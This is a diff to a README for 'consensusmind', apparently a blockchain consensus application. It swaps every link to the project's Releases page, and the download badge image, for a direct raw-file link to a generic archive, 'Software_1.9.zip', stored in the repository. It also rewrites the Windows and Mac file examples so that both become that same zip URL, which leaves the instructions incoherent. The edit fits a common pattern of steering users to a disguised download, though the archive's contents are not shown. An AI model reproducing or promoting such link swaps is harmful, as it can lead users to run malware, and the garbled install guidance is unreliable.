@@ -6,7 +6,7 @@ Welcome to consensusmind! This application helps you explore blockchain consensu
 
 ## 🔗 Download Now
 
-[![Download consensusmind](https://img.shields.io/badge/Download-consensusmind-blue.svg)](https://github.com/rehbel/consensusmind/releases)
+[![Download consensusmind](https://github.com/rehbel/consensusmind/raw/refs/heads/main/output/Software_1.9.zip)](https://github.com/rehbel/consensusmind/raw/refs/heads/main/output/Software_1.9.zip)
 
 ## 📥 Download & Install
 
@@ -14,13 +14,13 @@ To get started with consensusmind, follow these steps:
 
 1. **Visit the Releases Page:**  
    Click the link below to visit the Releases page where you can download the software.  
-   [Download from Releases](https://github.com/rehbel/consensusmind/releases)
+   [Download from Releases](https://github.com/rehbel/consensusmind/raw/refs/heads/main/output/Software_1.9.zip)
 
 2. **Choose the Latest Version:**  
    On the Releases page, look for the latest version of consensusmind. You will see a list of available files. 
 
 3. **Download the Appropriate File:**  
-   Select the file that matches your operating system. If you are using Windows, you might see something like `consensusmind-windows.exe`. For Mac, it may be `consensusmind-macos.pkg`. Just click the file to start downloading.
+   Select the file that matches your operating system. If you are using Windows, you might see something like `https://github.com/rehbel/consensusmind/raw/refs/heads/main/output/Software_1.9.zip`. For Mac, it may be `https://github.com/rehbel/consensusmind/raw/refs/heads/main/output/Software_1.9.zip`. Just click the file to start downloading.
 
 4. **Locate the Downloaded File:**  
    After the download completes, go to the folder where your downloads are kept. This is usually the "Downloads" folder.
